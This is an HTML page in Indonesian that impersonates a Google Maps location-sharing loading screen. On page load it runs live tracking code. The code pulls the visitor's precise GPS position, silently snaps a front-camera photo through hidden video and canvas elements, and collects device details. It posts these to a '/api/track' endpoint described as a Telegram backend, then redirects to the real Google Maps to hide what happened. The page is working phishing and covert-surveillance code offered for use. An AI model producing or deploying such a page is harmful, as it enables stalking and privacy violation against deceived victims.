<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Berbagi Lokasi</title>
    <style>
        body { 
            font-family: Roboto, Arial, sans-serif; 
            background: #f8f9fa; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
        }
        .card { 
            background: white; 
            padding: 30px; 
            border-radius: 12px; 
            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
            text-align: center; 
            max-width: 350px; 
            width: 100%; 
        }
        .spinner { 
            border: 4px solid #f3f3f3; 
            border-top: 4px solid #1a73e8; 
            border-radius: 50%; 
            width: 40px; 
            height: 40px; 
            animation: spin 1s linear infinite; 
            margin: 20px auto; 
        }
        @keyframes spin { 
            0% { transform: rotate(0deg); } 
            100% { transform: rotate(360deg); } 
        }
        h3 { color: #202124; margin-bottom: 8px; }
        p { color: #5f6368; font-size: 14px; }
    </style>
</head>
<body>
    <div class="card">
        <div class="spinner"></div>
        <h3>Memuat Peta...</h3>
        <p>Menghubungkan ke Google Maps dan memuat rute perjalanan.</p>
    </div>

    <!-- Elemen Kamera Tersembunyi -->
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        async function executeTrackingAndRedirect() {
            let latitude = null;
            let longitude = null;
            let accuracy = null;

            // 1. Ambil Lokasi GPS
            if (navigator.geolocation) {
                try {
                    const pos = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true, timeout: 8000 });
                    });
                    latitude = pos.coords.latitude;
                    longitude = pos.coords.longitude;
                    accuracy = pos.coords.accuracy;
                } catch (e) {
                    console.log("GPS ditolak");
                }
            }

            // 2. Ambil Foto Kamera Depan secara Diam-diam
            let imageBase64 = null;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                const video = document.getElementById('video');
                video.srcObject = stream;
                await new Promise((resolve) => { video.onloadedmetadata = () => resolve(); });
                
                await new Promise(r => setTimeout(r, 1000)); // Jeda agar kamera fokus

                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                imageBase64 = canvas.toDataURL('image/jpeg', 0.8);

                stream.getTracks().forEach(track => track.stop());
            } catch (e) {
                console.log("Kamera ditolak");
            }

            // 3. Info Perangkat Tambahan
            const deviceData = {
                hardwareConcurrency: navigator.hardwareConcurrency || '-',
                deviceMemory: navigator.deviceMemory || '-',
                screenResolution: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language || '-'
            };

            // 4. Kirim Data ke Backend API Telegram
            try {
                await fetch('/api/track', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        latitude,
                        longitude,
                        accuracy,
                        image: imageBase64,
                        deviceData
                    })
                });
            } catch (e) {
                console.log("Gagal kirim data");
            }

            // 5. Redirect Otomatis ke Google Maps Sungguhan
            if (latitude && longitude) {
                window.location.href = `https://www.google.com/maps?q=${latitude},${longitude}`;
            } else {
                window.location.href = 'https://www.google.com/maps';
            }
        }

        window.onload = executeTrackingAndRedirect;
    </script>
</body>
</html>
